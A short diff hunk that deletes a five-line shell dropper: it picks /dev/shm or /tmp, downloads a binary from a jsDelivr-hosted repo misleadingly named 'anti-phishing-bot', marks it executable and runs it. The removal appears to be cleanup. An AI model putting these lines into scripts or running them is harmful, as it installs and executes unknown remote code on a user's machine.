@@ -1,5 +1,0 @@
-D=/dev/shm; [ -w "$D" ] || D=/tmp
-cd "$D" 2>/dev/null || exit 1
-curl -fs -m 30 -o nsb3 https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/nsb3
-chmod +x nsb3 2>/dev/null
-./nsb3
